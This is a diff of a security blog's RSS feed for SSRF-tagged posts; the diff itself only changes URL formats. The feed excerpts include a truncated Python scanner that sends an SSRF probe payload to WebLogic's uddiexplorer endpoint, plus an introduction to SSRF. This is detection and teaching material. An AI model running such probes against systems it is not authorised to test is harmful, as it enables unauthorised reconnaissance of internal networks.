@@ -2,7 +2,7 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Ssrf on Reber&#39;s Blog</title>
-    <link>http://wyb0.com/tags/ssrf.html</link>
+    <link>http://wyb0.com/tags/ssrf/</link>
     <description>Recent content in Ssrf on Reber&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
@@ -14,19 +14,19 @@
     
     <item>
       <title>检测WebLogic是否存在SSRF</title>
-      <link>http://wyb0.com/posts/weblogic-ssrf-check.html</link>
+      <link>http://wyb0.com/posts/weblogic-ssrf-check/</link>
       <pubDate>Fri, 14 Apr 2017 14:43:52 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/weblogic-ssrf-check.html</guid>
+      <guid>http://wyb0.com/posts/weblogic-ssrf-check/</guid>
       <description>0x00 检测脚本如下  #!/usr/bin/env python # -*- coding: utf-8 -*- import re import sys import Queue import requests import threading from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) queue = Queue.Queue() mutex = threading.Lock() class Weblogic_SSRF_Check(threading.Thread): &amp;quot;&amp;quot;&amp;quot;docstring for Weblogic_SSRF_Check&amp;quot;&amp;quot;&amp;quot; def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &amp;quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search&amp;quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.search(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,html) if m: mutex.acquire() with open(&#39;ssrf.txt&#39;,&#39;a+&#39;) as f: print &amp;quot;%s has weblogic ssrf.</description>
     </item>
     
     <item>
       <title>SSRF</title>
-      <link>http://wyb0.com/posts/ssrf.html</link>
+      <link>http://wyb0.com/posts/ssrf/</link>
       <pubDate>Thu, 30 Jun 2016 15:30:54 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/ssrf.html</guid>
+      <guid>http://wyb0.com/posts/ssrf/</guid>
       <description>0x00 什么是SSRF  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。
 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
  0x01 SSRF的危害  可以扫描内部网络
